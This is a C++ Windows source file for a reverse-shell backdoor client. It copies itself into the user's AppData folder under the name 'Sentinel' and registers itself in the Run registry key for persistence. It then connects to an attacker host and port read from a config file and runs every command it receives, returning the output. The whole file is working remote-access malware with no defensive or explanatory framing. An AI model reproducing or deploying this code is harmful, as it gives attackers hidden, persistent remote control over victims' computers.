#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <stdio.h>
#include <filesystem>
#include <shlobj.h>

#pragma comment(lib, "ws2_32.lib")

std::string execCommand(const std::string& cmd) {
    char buffer[128];
    std::string result;

    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Failed to run command.\n";

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }

    _pclose(pipe);
    return result;
}

// Load IP and PORT from agent_config.txt
bool loadConfig(std::string &ip, int &port) {
    std::ifstream config("agent_config.txt");
    if (!config.is_open()) {
        std::cerr << "[!] Could not open agent_config.txt\n";
        return false;
    }
    std::string line;
    while (std::getline(config, line)) {
        if (line.find("IP=") == 0) {
            ip = line.substr(3);
        } else if (line.find("PORT=") == 0) {
            port = std::stoi(line.substr(5));
        }
    }
    return !(ip.empty() || port == 0);
}

// Persistence setup
void addPersistence() {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL , CSIDL_APPDATA , NULL , 0 , appDataPath);

    std::string folderPath = std::string(appDataPath) + "\\Sentinel";
    std::string TargetPath = folderPath + "\\server.exe";

    if(std::filesystem::exists(TargetPath)) return;
    std::filesystem::create_directory(folderPath);

    char CurrentPath[MAX_PATH];
    GetModuleFileNameA(NULL , CurrentPath , MAX_PATH);
    std::filesystem::copy(CurrentPath , TargetPath , std::filesystem::copy_options::overwrite_existing);

    HKEY hkey; 
    RegOpenKeyA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
    RegSetValueExA(hkey, "Sentinel", 0, REG_SZ, (BYTE*)TargetPath.c_str(), TargetPath.size() + 1);
    RegCloseKey(hkey);
};

int main() {
    std::cerr << "[*] Starting client\n";

    addPersistence();

    std::string serverIP;
    int serverPort = 0;
    if (!loadConfig(serverIP, serverPort)) {
        std::cerr << "[!] Invalid or missing config.\n";
        return 1;
    }

    WSADATA wsaData;
    int wsInit = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsInit != 0) {
        std::cerr << "[!] WSAStartup failed: " << wsInit << "\n";
        return 1;
    }
    std::cerr << "[*] WSA initialized\n";

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "[!] Socket creation failed: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }
    std::cerr << "[*] Socket created\n";

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());

    std::cerr << "[*] Attempting to connect...\n";
    int connectionResult = connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr));
    if (connectionResult == SOCKET_ERROR) {
        std::cerr << "[!] Connect failed: " << WSAGetLastError() << "\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    std::cerr << "[+] Connected to server\n";

    char buffer[4096];
    std::string output;

    while (true) {
        ZeroMemory(buffer, 4096);
        int bytesReceived = recv(sock, buffer, 4096, 0);
        if (bytesReceived <= 0) break;

        std::string command(buffer);

        if (command == "exit") {
            break;
        }

        output = execCommand(command);
        send(sock, output.c_str(), output.size() + 1, 0);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
